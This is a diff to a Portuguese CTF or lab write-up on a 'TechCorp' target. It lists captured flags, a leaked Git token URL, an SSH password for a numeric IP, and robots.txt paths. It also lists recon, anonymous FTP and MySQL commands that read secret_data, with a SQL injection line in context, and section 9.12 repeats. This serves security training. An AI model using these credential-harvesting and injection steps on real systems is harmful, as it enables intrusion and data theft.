@@ -107,3 +107,83 @@ UNION SELECT table_name,1,1 FROM information_schema.views;
 # FLAG{v13w_d1sc0v3ry_4dv4nc3d}
 
 ```
+## 9.9 Credenciais Git
+
+**Local:** `.git-credentials`
+
+https://admin:gh_p4t_S3cr3tT0k3n_2024_TechCorp@github.com
+
+**Flag:** `FLAG{g1t_cr3d3nt14ls_l34k}`
+
+
+## 9.10 Acesso SSH
+
+**Comando:**
+
+```bash
+ssh -p 2222 techcorp@98.95.207.28
+Password: TechCorp2024!
+
+
+````
+
+## 9.11 Robots.txt
+
+**Conteúdo:**
+
+```text
+User-agent: *
+Disallow: /admin/
+Disallow: /backup/
+Disallow: /config/
+Flag: FLAG{r0b0ts_txt_l34k4g3}
+
+```
+
+## 9.12 Código Fonte
+
+**Local:** `index.php`
+
+```t
+<!-- FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n} -->
+
+```
+
+## 9.12 Código Fonte
+
+**Local:** `index.php`
+
+```t
+<!-- FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n} -->
+
+```
+
+## 9.13 Comandos Executados
+
+### Reconhecimento
+
+```t
+curl http://98.95.207.28/robots.txt
+curl http://98.95.207.28/.git-credentials
+```
+
+### FTP
+
+```t
+ftp 98.95.207.28
+user: anonymous
+ls -R
+```
+
+### Banco de Dados
+
+```bash
+mysql -h 98.95.207.28 -u techcorp_user -p
+show tables;
+select * from secret_data;
+```
+
+
+
+
+
